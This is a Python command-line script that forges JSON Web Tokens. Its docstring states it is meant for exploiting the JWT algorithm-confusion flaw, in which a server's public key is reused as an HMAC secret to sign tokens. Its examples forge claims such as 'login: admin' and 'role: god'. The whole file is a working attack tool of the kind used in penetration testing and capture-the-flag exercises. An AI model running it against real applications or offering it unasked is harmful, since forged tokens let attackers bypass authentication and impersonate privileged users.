#!/usr/bin/env python3

"""
Basic script to build JWTs. Sometimes the online tools don't get it
in a specific way that the app expects.

May be useful for exploiting the first issue from this blog:
https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

Examples:
    $ jwt-builder.py  --payload '"login": "admin"' --secret hi
    $ jwt-builder.py  --payload '"login": "admin"' --pubkey ./pub.pem
        --alg HS512
"""

import argparse
import base64
import hashlib
import hmac
import re
import os
import sys


def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('--pubkey', type=str, action='store',
                        help='Read public key from file, which will be used '
                             'as the HMAC secret in the new JWT.')
    parser.add_argument('--secret', type=str, action='store',
                        help='Provide HMAC secret')
    parser.add_argument('--alg', type=str, action='store',
                        help='Algorithm. Defaults to HS256.',
                        default='HS256')
    parser.add_argument('--payload', type=str, action='store', required=True,
                        help='JWT payload, like \'"user": "admin", '
                             '"role": "god"\'')

    args = parser.parse_args()

    if args.pubkey and args.secret:
        print("Pick either a pubkey or a secret, not both.")
        sys.exit()

    if args.pubkey:
        if not os.path.isfile(args.pubkey):
            print("[!] That key file does not exist. Please try again.")
            sys.exit()

    if '256' in args.alg:
        args.hashlib = 'SHA256'
    if '512' in args.alg:
        args.hashlib = 'SHA512'

    return args


def process_pubkey(key_file):
    """Reads a public key file in. This is useful in attacks that tries to
    swap the algorithm to HMAC and uses this pubic key as the HMAC secret"""
    with open(key_file) as file_handler:
        data = file_handler.read()
        #data = data.strip()
    return data


def build_token(args):
    """ Uses all the provided variables to build a JWT"""
    # Configure and encode the header
    header = '{"alg":"' + args.alg + '", "typ": "JWT"}'
    header_b64 = base64.urlsafe_b64encode(header.encode())

    # Encode the payload
    payload = '{' + args.payload + '}'
    payload_b64 = base64.urlsafe_b64encode(payload.encode())

    # Build a signature
    unsigned_token = header_b64 + b'.' + payload_b64

    if '256' in args.alg:
        signature = hmac.new(args.secret.encode(), unsigned_token,
                             hashlib.sha256).digest()
    elif '512' in args.alg:
        signature = hmac.new(args.secret.encode(), unsigned_token,
                             hashlib.sha512).digest()

    signature_b64 = base64.urlsafe_b64encode(signature)

    # Put the token together
    token = header_b64 + b'.' + payload_b64 + b'.' + signature_b64
    token = token.decode('utf-8')

    # Print the stuffs
    print("Thanks for playing. Here is your token:\n")
    print("ENCODED:\n"
          "===============\n"
          + token + "\n")
    print("DECODED:\n"
          "==============\n"
          + header + "\n"
          + payload + "\n"
          + signature_b64.decode() + "\n")


def main():
    """Main program function"""
    args = process_args()
    if args.pubkey:
        args.secret = process_pubkey(args.pubkey)
    build_token(args)


if __name__ == '__main__':
    main()
